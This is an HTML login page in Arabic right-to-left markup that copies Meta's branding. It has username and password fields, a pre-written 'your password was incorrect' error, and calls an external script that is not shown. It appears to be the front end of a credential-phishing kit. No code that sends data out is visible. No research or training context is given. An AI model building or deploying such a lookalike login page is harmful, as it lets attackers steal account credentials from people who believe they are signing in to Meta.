<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            margin: 0;
            background-color: #ffffff;
            min-height: 100vh;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 400px;
        }
        .header {
            text-align: center;
            font-weight: bold;
            font-size: 20px;
            margin-bottom: 30px;
            margin-top: 10px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0064e0;
        }
        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .login-btn {
            background-color: #0064e0;
            color: white;
            transition: opacity 0.2s;
        }
        .login-btn:hover {
            opacity: 0.9;
        }
        .login-btn:disabled {
            opacity: 0.6;
            cursor: default;
        }
        .create-btn {
            background-color: transparent;
            border: 1px solid #0064e0;
            color: #0064e0;
            margin-top: 400px;
        }
        .forgot-password {
            text-align: center;
            font-weight: 600;
            color: #0064e0;
            cursor: pointer;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin-bottom: 10px;
            display: none;
        }
        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">∞ Meta</div>

    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
    
    <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
    <input type="password" id="password" placeholder="Password" autocomplete="new-password">
    
    <button class="login-btn" id="loginBtn">
        <span class="btn-text" id="btnText">Log in</span>
        <div class="spinner" id="spinner"></div>
    </button>
    
    <div class="forgot-password">Forgot password?</div>
    
    <button class="create-btn">Create new account</button>
</div>

<script src="script.js"></script>
</body>
</html>
